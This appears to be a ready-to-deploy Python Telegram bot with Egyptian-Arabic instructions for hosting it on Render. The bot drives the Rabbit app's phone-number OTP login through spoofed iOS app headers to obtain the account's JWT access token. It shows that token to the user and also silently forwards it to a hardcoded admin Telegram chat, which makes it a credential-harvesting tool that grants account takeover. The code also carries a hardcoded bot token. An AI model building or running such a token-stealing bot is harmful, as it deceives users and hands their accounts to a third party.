# bot.py

```python
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = "8062790260:AAEq7rx2tWm40xF-66PazMx8CV2PYGC6a9E"
ADMIN_ID = 8384490617

GRAPHQL_URL = "https://http-bk.rabbit-api.app/graphql"

headers = {
    "Host": "http-bk.rabbit-api.app",
    "x-rabbit-app-version": "2.6.1",
    "Accept": "*/*",
    "Accept-Language": "en",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "User-Agent": "newRabbit/3 CFNetwork/3860.400.51 Darwin/25.3.0",
    "Connection": "keep-alive",
    "x-rabbit-platform": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "x-rabbit-device": "784BA469-E6AE-436E-87EB-C16AEF7B8403"
}

users = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "ابعت رقم الموبايل بدون 0 أو +2\nمثال:\n1012345678"
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in users:
        phone = text

        payload = {
            "operationName": "getVerificationCode",
            "variables": {
                "phoneNumber": f"+2{phone}"
            },
            "query": """
            mutation getVerificationCode($phoneNumber: String!, $isResend: Boolean) {
                getVerificationCode(
                    phoneNumber: $phoneNumber,
                    isResend: $isResend
                )
            }
            """
        }

        response = requests.post(
            GRAPHQL_URL,
            json=payload,
            headers=headers
        )

        users[user_id] = phone

        await update.message.reply_text(
            f"OTP اتبعت.\nابعت الكود دلوقتي.\n\n{response.text}"
        )

    else:
        phone = users[user_id]
        otp = text

        payload = {
            "operationName": "verifyCode",
            "variables": {
                "phoneNumber": f"+2{phone}",
                "verificationCode": otp
            },
            "query": """
            mutation verifyCode(
                $phoneNumber: String!,
                $verificationCode: String!
            ) {
                verifyCode(
                    phoneNumber: $phoneNumber,
                    verificationCode: $verificationCode
                ) {
                    isNewUser
                    accessToken
                    sucess
                    phoneNumber
                    __typename
                }
            }
            """
        }

        verify_headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0"
        }

        response = requests.post(
            GRAPHQL_URL,
            json=payload,
            headers=verify_headers
        )

        try:
            data = response.json()
            token = data["data"]["verifyCode"]["accessToken"]

            await update.message.reply_text(
                f"JWT TOKEN:\n\n{token}"
            )

            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"New Token:\n\n{token}"
            )

        except Exception:
            await update.message.reply_text(response.text)

        del users[user_id]


app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

print("BOT STARTED...")

app.run_polling()
```

---

# requirements.txt

```txt
python-telegram-bot==22.0
requests
```

---

# render.yaml

```yaml
services:
  - type: worker
    name: rabbit-bot
    runtime: python
    buildCommand: pip install -r requirements.txt
    startCommand: python bot.py
```

---

# خطوات Render

1. اعمل Repository جديد على GitHub
2. ارفع الملفات:

   * bot.py
   * requirements.txt
   * render.yaml
3. افتح Render
4. New +
5. Background Worker
6. اختار الـ Repository
7. Deploy

هيشتغل تلقائي.
